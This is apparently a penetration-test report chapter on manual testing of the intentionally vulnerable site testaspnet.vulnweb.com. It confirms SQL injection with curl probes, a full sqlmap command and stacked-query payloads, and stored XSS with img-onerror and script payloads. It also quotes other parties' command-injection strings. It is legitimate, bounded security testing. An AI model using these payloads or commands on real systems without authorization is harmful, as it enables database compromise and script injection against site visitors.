# 03 — Phase 1: Manual Testing

Hand-driven testing with `curl`, a real browser, and the small purpose-built
probes in `scripts/`. Every observation below was reproduced live against
`testaspnet.vulnweb.com` on 2026-11-23.

---

## 3.1 SQL Injection — `Comments.aspx?id`

**Technique: differential responses** (`scripts/sqli_manual_probe.py`,
evidence: [`evidence/sqlmap/manual_probe_comments_id.json`](../evidence/sqlmap/manual_probe_comments_id.json)).

| Request | HTTP | Body size | Interpretation |
|---------|------|-----------|----------------|
| `id=1` (baseline) | 200 | **13 390 B** | normal record page |
| `id=1'` (single quote) | 200 | **0 B** | query breaks → empty render |
| `id=1 AND 1=1` (numeric) | 200 | 13 400 B | accepted, page renders |

The decisive signal: **appending a single quote collapses the response from
13 390 bytes to 0 bytes.** A bare `'` reaching a well-written, parameterized query
would be treated as data and change nothing. Here it changes everything — the quote
is being concatenated straight into the SQL statement, breaking its syntax, so the
query returns nothing and the page renders empty. That is textbook SQL injection
(CWE-89) on the `id` parameter.

Reproduce:

```bash
curl -s -o /dev/null -w "%{size_download}\n" "http://testaspnet.vulnweb.com/Comments.aspx?id=1"    # 13390
curl -s -o /dev/null -w "%{size_download}\n" "http://testaspnet.vulnweb.com/Comments.aspx?id=1%27" # 0
```

> **Note on timing tests.** Time-based payloads (`WAITFOR DELAY`) were inconclusive
> *by hand* because this host's network latency is noisy (clean requests varied from
> 2 s to 20 s). This is exactly the kind of statistical confirmation sqlmap does well,
> and it is deferred to the sqlmap step in [§3.3](#33-sqlmap-confirmation).

The same quote-collapse behaviour was observed on `ReadNews.aspx?id`
([`manual_probe_readnews_id.json`](../evidence/sqlmap/manual_probe_readnews_id.json)),
i.e. a **second** injectable parameter.

---

## 3.2 Cross-Site Scripting

### 3.2.1 Reflected XSS via URL parameters — **mitigated by the framework**

Probing `ReadNews.aspx?id` and `?NewsAd` with a canary containing `<`/`>`
(`scripts/xss_manual_probe.py`) returned the ASP.NET error page:

```
A potentially dangerous Request.QueryString value was detected from the client (id="<zzxss...>").
```

ASP.NET **Request Validation** rejects angle brackets in the query string, and the
canary comes back **HTML-encoded** (`&lt;zzxss…&gt;`). So the reflected-XSS vector via
URL parameters is **not exploitable** here — a genuine, and useful, negative result.
Evidence: [`evidence/xss/probe_readnews_id.json`](../evidence/xss/probe_readnews_id.json).

### 3.2.2 Stored XSS via the comment form — **CONFIRMED**

The comment field `tbComment` (POST to `Comments.aspx`) is **not** output-encoded and
is **not** protected by Request Validation on this app. Submitting a harmless canary
`<zzxss…zz>` and re-reading the page shows it stored **raw**:

```
...<DIV class="CommentText"><zzxssc98b8a1dzz></DIV>...
```

Escalating server-side (via `requests`) confirms the sink accepts full script markup
unencoded:

| Payload submitted to `tbComment` | Stored in page as | Result |
|----------------------------------|-------------------|--------|
| `<b>hello</b>` | `<b>hello</b>` | unencoded |
| `<img src=x onerror=alert(1)>` | `<img src=x onerror=alert(1)>` | unencoded — **executes** |
| `<script>x=1</script>` | `<script>x=1</script>` | unencoded — **executes** |

Because the markup is emitted verbatim into the page, **any visitor who opens the
comment thread runs the attacker's JavaScript** — classic **stored XSS** (CWE-79).
Evidence: [`evidence/xss/stored_probe.json`](../evidence/xss/stored_probe.json) and the
proof-of-concept render [`evidence/xss/poc_render.html`](../evidence/xss/poc_render.html)
(open it in a browser — it shows the exact unmodified server bytes being parsed as HTML).

> **Ethics.** Testing used non-executing canaries and benign, self-contained markers.
> No credential-stealing, redirecting, or persistent attack code was planted. The site
> states it purges comments daily. See [`00-rules-of-engagement.md`](00-rules-of-engagement.md).

During live browser testing the shared comment pages were observed carrying **other
parties' active injection attempts** (`r87.com/n`, `ping -w 25 127.0.0.1`, `|sleep 25`),
visible in [`evidence/xss/browser_comment_field_active_injections.jpg`](../evidence/xss/browser_comment_field_active_injections.jpg)
— independent corroboration that this field is a live, exploitable sink.

---

## 3.3 sqlmap confirmation

See [`evidence/sqlmap/`](../evidence/sqlmap/) for the raw run log. sqlmap was executed
through the guardrails (risk/level 2), i.e. the exact command:

```
python -m sqlmap -u "http://testaspnet.vulnweb.com/Comments.aspx?id=1" \
    --level 2 --risk 2 --batch --threads 2 --flush-session \
    -p id --banner --current-db --current-user --is-dba --dbs
```

**Result — `id` is injectable by three independent techniques** (202 HTTP requests,
log: [`evidence/sqlmap/sqlmap_comments_id.log`](../evidence/sqlmap/sqlmap_comments_id.log)):

```
sqlmap identified the following injection point(s):
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1954=1954
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: id=1;WAITFOR DELAY '0:0:5'--
    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: id=1 WAITFOR DELAY '0:0:5'
back-end DBMS: Microsoft SQL Server 2014
```

This independently confirms the manual quote-collapse result and pins the backend to
**Microsoft SQL Server 2014**. The **stacked-queries** capability is the most serious:
it allows chaining entirely separate statements (here, `WAITFOR DELAY`), the building
block for data modification. Enumeration was intentionally bounded (metadata requests
only, no bulk data) and the slow blind extraction was cut short once impact was proven,
per [`00-rules-of-engagement.md`](00-rules-of-engagement.md).

---

## 3.4 Phase 1 summary

| Entry point | Vulnerability | Method that proved it | Confidence |
|-------------|---------------|------------------------|------------|
| `Comments.aspx?id` | SQL injection (CWE-89) | quote-collapse + sqlmap | High |
| `ReadNews.aspx?id` | SQL injection (CWE-89) | quote-collapse | High |
| `Comments.aspx` `tbComment` | Stored XSS (CWE-79) | canary stored unencoded | High |
| `ReadNews.aspx?id` / `?NewsAd` | Reflected XSS | **blocked** by Request Validation | n/a (negative) |
